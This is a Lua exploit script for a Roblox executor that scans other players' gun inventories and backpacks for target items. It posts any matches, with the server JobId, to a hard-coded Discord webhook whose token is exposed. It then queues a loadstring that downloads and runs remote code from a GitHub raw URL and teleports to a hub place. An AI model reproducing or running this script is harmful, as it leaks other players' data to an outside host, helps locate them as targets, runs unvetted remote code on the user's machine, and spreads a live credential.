-- SCANNER COM TRAVA DE CARREGAMENTO E EMBED (MINIMALISTA)
local Players = game:GetService("Players")
local HttpService = game:GetService("HttpService")
local TeleportService = game:GetService("TeleportService")

local WEBHOOK_URL = "https://discord.com/api/webhooks/1514031008654295040/efj6sTrpu2HRERFEALNMWpgsCAT0b_7V_S4oFrwclE9rkcfQ8si3EfSpaZ3rNTTnAzVq"
local HUB_PLACE_ID = 15327728308

local ITENS_ALVO = {"barret50", "renellim4", "m79", "backpacktier4"}

if not game:IsLoaded() then
    game.Loaded:Wait()
end

local function sendEmbedToDiscord(embedData)
    local req = syn and syn.request or http_request or request
    if req then
        pcall(function()
            req({
                Url = WEBHOOK_URL,
                Method = "POST",
                Headers = {["Content-Type"] = "application/json"},
                Body = HttpService:JSONEncode({embeds = {embedData}})
            })
        end)
    end
end

-- Espera 8 segundos para dar tempo do Roblox baixar os inventários
task.wait(8)

local fields = {}
local foundCount = 0

for _, player in ipairs(Players:GetPlayers()) do
    if player == Players.LocalPlayer then continue end
    
    local inv = player:WaitForChild("GunInventory", 3)
    if inv then
        for _, obj in ipairs(inv:GetChildren()) do
            if obj:IsA("ObjectValue") and obj.Value then
                local nome = obj.Value.Name
                for _, alvo in ipairs(ITENS_ALVO) do
                    if nome and nome:lower():find(alvo:lower()) then
                        local mag = obj:FindFirstChild("BulletsInMagazine") and obj.BulletsInMagazine.Value or 0
                        table.insert(fields, {
                            name = player.Name,
                            value = nome .. " (" .. mag .. " balas)",
                            inline = true
                        })
                        foundCount += 1
                    end
                end
            end
        end
    end
    
    local bp = player:GetAttribute("EquipmentBackpack")
    if bp and tostring(bp):lower():find("backpacktier4") then
        table.insert(fields, {
            name = player.Name,
            value = "BackpackTier4",
            inline = true
        })
        foundCount += 1
    end
end

-- Só monta e envia a Embed se tiver encontrado pelo menos 1 item
if foundCount > 0 then
    local embed = {
        color = 16711680, -- Vermelho
        fields = fields,
        footer = {text = "JobId: " .. game.JobId}
    }
    
    -- Envia a Embed consolidada
    sendEmbedToDiscord(embed)
end

task.wait(3)

local qt = queue_on_teleport or queueteleport or (syn and syn.queue_on_teleport)
if qt then
    qt([[loadstring(game:HttpGet("https://raw.githubusercontent.com/cajiwghdtyasdnhatfy/Acaswartqaawr/refs/heads/main/Hub"))()]])
end

TeleportService:Teleport(HUB_PLACE_ID)
